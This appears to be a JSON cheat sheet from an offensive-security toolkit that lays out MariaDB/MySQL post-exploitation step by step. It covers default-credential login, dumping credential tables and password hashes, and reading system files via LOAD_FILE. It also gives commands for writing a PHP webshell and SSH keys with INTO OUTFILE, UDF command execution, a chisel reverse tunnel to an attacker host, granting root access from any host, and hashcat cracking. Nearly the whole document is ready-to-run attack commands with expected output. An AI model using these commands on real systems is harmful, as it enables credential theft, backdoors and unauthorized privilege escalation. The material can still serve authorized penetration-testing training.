{
  "cheatsheets": [
    {
      "id": "mariadb-mysql-enumeration",
      "name": "MariaDB/MySQL Enumeration and Privilege Escalation",
      "description": "Comprehensive MariaDB/MySQL post-exploitation methodology for credential extraction, privilege escalation, and lateral movement. Covers database enumeration, user hunting, file operations, and UDF attacks.",
      "educational_header": {
        "how_to_recognize": [
          "You discovered MySQL/MariaDB on port 3306 during enumeration",
          "You gained access to a box running XAMPP, WAMP, LAMP stack",
          "You found database credentials in config files (my.ini, wp-config.php)",
          "MySQL is running and you need to extract credentials for pivoting"
        ],
        "when_to_look_for": [
          "After compromising a web server with backend database",
          "When you find database credentials in config files",
          "During post-exploitation to harvest stored credentials",
          "When MySQL is only accessible from localhost (need tunnel or local shell)"
        ],
        "key_concepts": [
          "Default MySQL root has no password in XAMPP/WAMP installations",
          "MySQL host restrictions: root@localhost differs from root@% - check mysql.user for allowed hosts",
          "FILE privilege enables reading/writing files on the filesystem",
          "UDF (User Defined Functions) can execute system commands if plugin_dir is writable",
          "secure_file_priv: NULL = disabled, empty = anywhere, path = restricted to that directory"
        ]
      },
      "scenarios": [
        {
          "title": "Scenario 1: Initial Database Access",
          "context": "You gained shell on a Windows/Linux box running MySQL/MariaDB. You need to test authentication and enumerate the database for credentials.",
          "approach": "Try default credentials (root with no password), then enumerate version, users, and databases. Look for credential-related databases and tables.",
          "commands": [
            "mysql-connect-nopass",
            "mysql-version",
            "mysql-current-user",
            "mysql-show-databases",
            "mysql-list-users"
          ],
          "expected_outcome": "Gain database access, identify version for CVE research, discover databases like 'creds', 'users', 'webapp' containing application credentials that may be reused for Windows/Linux accounts.",
          "why_this_works": "XAMPP/WAMP default installations have no root password. Developers often store application credentials in databases. Password reuse between database and system accounts is extremely common."
        },
        {
          "title": "Scenario 2: Credential Extraction from Databases",
          "context": "You have MySQL access and found interesting databases. You need to systematically extract stored credentials for lateral movement.",
          "approach": "List all tables, identify credential-related tables (users, accounts, credentials, admins), dump their contents. Search for password columns across all databases.",
          "commands": [
            "mysql-show-tables",
            "mysql-describe-table",
            "mysql-dump-table",
            "mysql-search-password-columns",
            "mysql-dump-all-users"
          ],
          "expected_outcome": "Extract plaintext or hashed passwords. Plaintext can be used directly for pivoting. Hashes can be cracked (MD5, bcrypt, etc.) or used in pass-the-hash scenarios depending on the application.",
          "why_this_works": "Web applications store user credentials in databases. Many use weak hashing (MD5, SHA1) or even plaintext. Credentials often match domain or local Windows accounts due to password reuse."
        },
        {
          "title": "Scenario 3: MySQL User Privilege Enumeration",
          "context": "You need to understand what privileges your MySQL user has for potential privilege escalation vectors (file read/write, UDF).",
          "approach": "Check current grants, then query mysql.user for dangerous privileges: File_priv, Super_priv, Process_priv. Check secure_file_priv restrictions.",
          "commands": [
            "mysql-show-grants",
            "mysql-check-file-priv",
            "mysql-check-dangerous-privs",
            "mysql-check-secure-file-priv",
            "mysql-check-plugin-dir"
          ],
          "expected_outcome": "Identify if FILE privilege is available (read/write files), SUPER privilege (UDF loading), and whether secure_file_priv restricts file operations. Empty secure_file_priv = write anywhere.",
          "why_this_works": "MySQL privileges map to system-level capabilities. FILE privilege allows reading sensitive files (/etc/shadow, config files) and writing webshells. SUPER allows loading UDF for command execution."
        },
        {
          "title": "Scenario 4: File System Access via MySQL",
          "context": "Your MySQL user has FILE privilege. You want to read sensitive files or write a webshell for persistent access.",
          "approach": "Use LOAD_FILE() to read system files (passwd, shadow, web configs). Use INTO OUTFILE to write webshells to web root if writable.",
          "commands": [
            "mysql-read-file-linux",
            "mysql-read-file-windows",
            "mysql-read-config",
            "mysql-write-webshell-linux",
            "mysql-write-webshell-windows"
          ],
          "expected_outcome": "Read /etc/passwd, /etc/shadow (if MySQL runs as root), web config files with additional credentials. Write PHP webshell to htdocs for persistent command execution.",
          "why_this_works": "LOAD_FILE reads files as the MySQL service user (often root on Linux, SYSTEM on Windows). INTO OUTFILE writes files with MySQL user permissions. Web roots are often world-writable for deployment."
        },
        {
          "title": "Scenario 5: UDF Privilege Escalation (Linux)",
          "context": "You have SUPER and FILE privileges on a Linux MySQL installation. You want to execute system commands for privilege escalation.",
          "approach": "Check plugin_dir location, verify it's writable, upload UDF shared library, create function, execute commands as MySQL service user.",
          "commands": [
            "mysql-check-plugin-dir",
            "mysql-check-plugin-dir-writable",
            "mysql-create-udf-function",
            "mysql-exec-udf-command"
          ],
          "expected_outcome": "Execute system commands as the MySQL service user. On older systems this may be root. Can add SSH keys, create users, or execute reverse shell.",
          "why_this_works": "UDF allows loading arbitrary shared libraries that execute as the MySQL process. If MySQL runs as root, you get root command execution. Even as mysql user, you may find sudoers entries or other privilege escalation paths."
        },
        {
          "title": "Scenario 6: Remote Access Setup via Tunneling",
          "context": "MySQL only accepts localhost connections (root@localhost). You need to access it from your attack box for easier enumeration.",
          "approach": "Use SSH tunnel, chisel, or ligolo to forward port 3306 from target to attacker. Then connect with full MySQL client capabilities.",
          "commands": [
            "mysql-check-bind-address",
            "tunnel-chisel-reverse",
            "tunnel-ssh-local",
            "mysql-grant-remote"
          ],
          "expected_outcome": "Access MySQL from Kali with full client features (tab completion, easier dumping, mysql-dump). Alternatively, grant remote access by creating root@% user.",
          "why_this_works": "MySQL bind-address and user@host restrictions limit connections. Tunneling bypasses network restrictions while appearing as localhost. Granting remote access modifies MySQL ACLs directly."
        }
      ],
      "sections": [
        {
          "title": "Phase 1: Connection and Basic Enumeration",
          "notes": "First establish database access. Try default credentials, then gather version and user information. Version determines available exploits and features.",
          "commands": [
            {
              "id": "mysql-connect-nopass",
              "example": "mysql -h 127.0.0.1 -u root",
              "shows": "Welcome to the MariaDB monitor. Server version: 10.3.24-MariaDB"
            },
            {
              "id": "mysql-connect-password",
              "example": "mysql -h 127.0.0.1 -u root -p'password123'",
              "shows": "Welcome to the MariaDB monitor."
            },
            {
              "id": "mysql-version",
              "example": "SELECT VERSION(); SELECT @@version;",
              "shows": "10.3.24-MariaDB"
            },
            {
              "id": "mysql-current-user",
              "example": "SELECT user(); SELECT current_user();",
              "shows": "root@localhost"
            },
            {
              "id": "mysql-hostname",
              "example": "SELECT @@hostname;",
              "shows": "ERA"
            },
            {
              "id": "mysql-datadir",
              "example": "SELECT @@datadir; SELECT @@basedir;",
              "shows": "/var/lib/mysql/ or C:\\xampp\\mysql\\data\\"
            }
          ]
        },
        {
          "title": "Phase 2: Database and Table Discovery",
          "notes": "Enumerate all databases and tables. Look for credential-related names: creds, users, accounts, passwords, admin, config.",
          "commands": [
            {
              "id": "mysql-show-databases",
              "example": "SHOW DATABASES;",
              "shows": "creds, information_schema, mysql, performance_schema, phpmyadmin, webapp"
            },
            {
              "id": "mysql-show-tables",
              "example": "USE creds; SHOW TABLES;",
              "shows": "users, credentials, api_keys, admin_accounts"
            },
            {
              "id": "mysql-describe-table",
              "example": "DESCRIBE users; SHOW COLUMNS FROM credentials;",
              "shows": "id INT, username VARCHAR, password VARCHAR, email VARCHAR"
            },
            {
              "id": "mysql-dump-table",
              "example": "SELECT * FROM creds.users;",
              "shows": "1, admin, Password123!, admin@secura.yzx"
            },
            {
              "id": "mysql-search-password-columns",
              "example": "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%pass%' OR column_name LIKE '%pwd%' OR column_name LIKE '%cred%' OR column_name LIKE '%secret%';",
              "shows": "webapp, users, password | creds, api_keys, secret_key"
            },
            {
              "id": "mysql-search-user-columns",
              "example": "SELECT table_schema, table_name, column_name FROM information_schema.columns WHERE column_name LIKE '%user%' OR column_name LIKE '%login%' OR column_name LIKE '%admin%' OR column_name LIKE '%email%';",
              "shows": "webapp, users, username | webapp, users, email"
            }
          ]
        },
        {
          "title": "Phase 3: MySQL User and Privilege Enumeration",
          "notes": "Understand MySQL user landscape. Extract password hashes for offline cracking. Check for dangerous privileges that enable file access or code execution.",
          "commands": [
            {
              "id": "mysql-list-users",
              "example": "SELECT user, host FROM mysql.user;",
              "shows": "root@localhost, root@127.0.0.1, pma@localhost, webapp@%"
            },
            {
              "id": "mysql-dump-all-users",
              "example": "SELECT user, host, password FROM mysql.user;",
              "shows": "root, localhost, *2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19 (password123)"
            },
            {
              "id": "mysql-dump-users-new",
              "example": "SELECT user, host, authentication_string FROM mysql.user;",
              "shows": "For MySQL 5.7+ where password column renamed"
            },
            {
              "id": "mysql-show-grants",
              "example": "SHOW GRANTS; SHOW GRANTS FOR current_user();",
              "shows": "GRANT ALL PRIVILEGES ON *.* TO 'root'@'localhost'"
            },
            {
              "id": "mysql-check-file-priv",
              "example": "SELECT File_priv FROM mysql.user WHERE user=SUBSTRING_INDEX(current_user(),'@',1);",
              "shows": "Y (can read/write files)"
            },
            {
              "id": "mysql-check-dangerous-privs",
              "example": "SELECT user, host, File_priv, Super_priv, Process_priv FROM mysql.user;",
              "shows": "root, localhost, Y, Y, Y"
            }
          ]
        },
        {
          "title": "Phase 4: File System Operations",
          "notes": "If FILE privilege is available, read sensitive files and write webshells. Check secure_file_priv first - empty value means unrestricted.",
          "commands": [
            {
              "id": "mysql-check-secure-file-priv",
              "example": "SHOW VARIABLES LIKE 'secure_file_priv';",
              "shows": "NULL=disabled, empty=anywhere, /path/=restricted"
            },
            {
              "id": "mysql-read-file-linux",
              "example": "SELECT LOAD_FILE('/etc/passwd');",
              "shows": "root:x:0:0:root:/root:/bin/bash..."
            },
            {
              "id": "mysql-read-file-windows",
              "example": "SELECT LOAD_FILE('C:/Windows/System32/drivers/etc/hosts');",
              "shows": "127.0.0.1 localhost..."
            },
            {
              "id": "mysql-read-config",
              "example": "SELECT LOAD_FILE('C:/xampp/htdocs/config.php');",
              "shows": "$db_password = 'secretpass123';"
            },
            {
              "id": "mysql-write-webshell-linux",
              "example": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';",
              "shows": "Query OK, 1 row affected"
            },
            {
              "id": "mysql-write-webshell-windows",
              "example": "SELECT '<?php system($_GET[\"cmd\"]); ?>' INTO OUTFILE 'C:/xampp/htdocs/shell.php';",
              "shows": "Query OK, 1 row affected"
            },
            {
              "id": "mysql-write-ssh-key",
              "example": "SELECT 'ssh-rsa AAAA...' INTO OUTFILE '/root/.ssh/authorized_keys';",
              "shows": "Adds SSH key for root access (if MySQL runs as root)"
            }
          ]
        },
        {
          "title": "Phase 5: UDF Privilege Escalation",
          "notes": "User Defined Functions allow loading shared libraries for command execution. Requires SUPER privilege and writable plugin directory. Most effective on Linux.",
          "commands": [
            {
              "id": "mysql-check-plugin-dir",
              "example": "SHOW VARIABLES LIKE 'plugin_dir'; SELECT @@plugin_dir;",
              "shows": "/usr/lib/mysql/plugin/ or C:\\xampp\\mysql\\lib\\plugin\\"
            },
            {
              "id": "mysql-create-udf-function",
              "example": "CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';",
              "shows": "Query OK (after uploading UDF library to plugin_dir)"
            },
            {
              "id": "mysql-exec-udf-command",
              "example": "SELECT sys_exec('id > /tmp/output.txt');",
              "shows": "0 (success), check /tmp/output.txt for command output"
            },
            {
              "id": "mysql-drop-udf",
              "example": "DROP FUNCTION sys_exec;",
              "shows": "Cleanup after exploitation"
            }
          ]
        },
        {
          "title": "Phase 6: Tunneling for Remote Access",
          "notes": "When MySQL only allows localhost connections, tunnel through compromised host. Chisel reverse port forward is most reliable through firewalls.",
          "commands": [
            {
              "id": "mysql-check-bind-address",
              "example": "SHOW VARIABLES LIKE 'bind_address';",
              "shows": "127.0.0.1 (localhost only) or 0.0.0.0 (all interfaces)"
            },
            {
              "id": "tunnel-chisel-server",
              "example": "chisel server -p 8080 --reverse",
              "shows": "Run on Kali - listens for chisel client connections"
            },
            {
              "id": "tunnel-chisel-client",
              "example": ".\\chisel.exe client KALI_IP:8080 R:3306:127.0.0.1:3306",
              "shows": "Run on target - forwards local MySQL to Kali"
            },
            {
              "id": "tunnel-ssh-local",
              "example": "ssh -L 3306:127.0.0.1:3306 user@target",
              "shows": "SSH local forward if you have SSH access"
            },
            {
              "id": "mysql-grant-remote",
              "example": "GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY ''; FLUSH PRIVILEGES;",
              "shows": "Allow root from any host (less stealthy)"
            }
          ]
        },
        {
          "title": "Phase 7: Hash Cracking",
          "notes": "MySQL password hashes can be cracked offline. MySQL 4.1+ uses SHA1-based hashing. Extract hashes and crack with hashcat.",
          "commands": [
            {
              "id": "mysql-extract-hash",
              "example": "SELECT user, password FROM mysql.user WHERE password != '';",
              "shows": "*2470C0C06DEE42FD1618BB99005ADCA2EC9D1E19"
            },
            {
              "id": "hashcat-mysql41",
              "example": "hashcat -m 300 mysql_hashes.txt /usr/share/wordlists/rockyou.txt",
              "shows": "Crack MySQL 4.1+ hashes (mode 300)"
            },
            {
              "id": "hashcat-mysql323",
              "example": "hashcat -m 200 mysql_hashes.txt /usr/share/wordlists/rockyou.txt",
              "shows": "Crack old MySQL 3.23 hashes (mode 200)"
            }
          ]
        }
      ],
      "tags": [
        "MYSQL",
        "MARIADB",
        "DATABASE",
        "POST_EXPLOITATION",
        "CREDENTIAL_HUNTING",
        "PRIVILEGE_ESCALATION",
        "FILE_READ",
        "UDF"
      ]
    }
  ]
}